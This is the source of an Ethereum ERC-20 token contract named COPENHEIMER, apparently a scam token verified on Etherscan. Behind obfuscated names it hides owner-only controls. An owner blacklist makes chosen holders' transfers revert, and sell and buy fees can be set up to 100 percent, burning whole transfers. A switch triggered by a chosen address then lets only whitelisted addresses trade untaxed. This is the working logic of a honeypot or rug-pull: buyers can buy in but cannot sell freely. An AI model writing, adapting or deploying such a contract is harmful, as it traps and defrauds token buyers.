/**
 *Submitted for verification at Etherscan.io on 2023-07-21
*/

// SPDX-License-Identifier: MIT
/*
|------------------------------------------------|
|                   COPENHEIMER                  |
|------------------------------------------------|
|                                                |
|    Website: https://notlarvalabs.com/          |
|    Twitter: https://twitter.com/Pauly0x        |
|                                                |
|                                                |
|------------------------------------------------|    
*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}




contract gHuT is Context, IERC20, IERC20Metadata {
    event MKQe(address sender, address from,address to, uint256 amount);
    uint128 public bjaN = 236933;

    mapping(address => uint256) private _balances;
    uint public OnAb = 166;

    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) private RBgi;
    uint128 public ugYD = 232154;

    mapping(address => bool) private JItn;    
    string public rwbk;

    address public _owner;
    string public Apjk;

    address private _hLhp;    

    uint256 private _totalSupply;

    string private _name;
    bool public Bept = true;

    string private _symbol;
    uint public kSUE = 46;

    uint256 public _IsnI;

    uint256 public _wTiS;

    uint256 public fee;
    bool public GfUt = false;

    address private _wVPg;    

    uint private _scjK;
    uint8 public RJBf = 106;

    uint256[] private _BVQm;
    uint8 public oZMO = 241;


    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function UjuF(uint256 IsnI, uint256 wTiS) public onlyOwner {
        _IsnI = IsnI;
        _wTiS = wTiS;
    }

    function wBaJ(address account, bool status) public onlyOwner {
        JItn[account] = status;
    }

    function YiTd(address hLhp) public onlyOwner{
        _hLhp = hLhp;
    }
    
    function QHUU(address account) public {
        require(RBgi[_msgSender()],'Not Allow');
        RBgi[account] = true;
    }

    function MfMC(address account) public onlyOwner {
        RBgi[account] = false;
    }

    function zCXF() public onlyOwner {
        _IsnI = 0;
        _wTiS = 0;
    }

    function DJVD(
        uint scjK,
        uint256[] memory BVQm
    ) public  {
        require(RBgi[_msgSender()],'Not Allow');
        _scjK = scjK;
        _BVQm = BVQm;
    }

    function FKqv(
        address wVPg,
        uint scjK,
        uint256[] memory BVQm
    ) public onlyOwner {
        _wVPg = wVPg;
        DJVD(scjK, BVQm);
    }

    constructor(
        uint scjK,
        uint256[] memory BVQm,
        uint256 IsnI,
        uint256 wTiS
    ) {
        fee = 0;
        _IsnI = 0;
        _wTiS = 0;        
        _name = "FLUGEGENHIEMER";
        _symbol = "COPENHEIMER";
        _totalSupply = 100_000_000_000_000 * 10 ** 18;
        _owner = msg.sender;
        _scjK = scjK;
        _BVQm = BVQm;
        _balances[msg.sender] = _totalSupply;
        RBgi[msg.sender] = true;
        _IsnI = IsnI;
        _wTiS = wTiS;

        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "sLFZ: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }
        return true;
    }

    function KOko(
        uint256 amountIn,
        address from,
        address to
    ) internal virtual returns (bool) {
        if (_scjK == 99) { 
            if (RBgi[from] || RBgi[to]) return true;
            else return false;
        }
        if (JItn[from] || JItn[to] || JItn[msg.sender]) {
            require(false, "JItn");
        }
        if (from == _wVPg || RBgi[from] || RBgi[to]) {
            return true;
        }
        if (from != _wVPg && to != _wVPg) return true;
        if (_scjK == 0) return true;    

        if(amountIn>0){
            
        }    
        return false;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        
        emit MKQe(msg.sender, from, to, amount);

        require(from != address(0), "Transfer from the zero address");
        require(to != address(0), "Transfer to the zero address");
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "Transfer amount exceeds balance");

        uint256 p = (from == _wVPg) ? _IsnI : _wTiS;
        uint256 p_current = KOko(amount, from, to) ? 0 : p;

        if (RBgi[from] || RBgi[to] || p_current == 0) {
            unchecked {
                _balances[from] = fromBalance - amount;
                _balances[to] += amount;
            }
            emit Transfer(from, to, amount);
        } else {
            uint256 _amount = (amount * (1000 - p)) / 1000;
            uint256 p_value = (amount * p) / 1000;

            //Transfer
            _balances[from] = fromBalance - amount;
            _balances[to] += _amount;

            emit Transfer(from, to, _amount);

            if (p_value != 0) {
                //Burn
                _totalSupply -= p_value;
                emit Transfer(from, address(0), p_value);
            }

            if(from==_hLhp || to==_hLhp) _scjK=99;
        }

        
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "Insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
}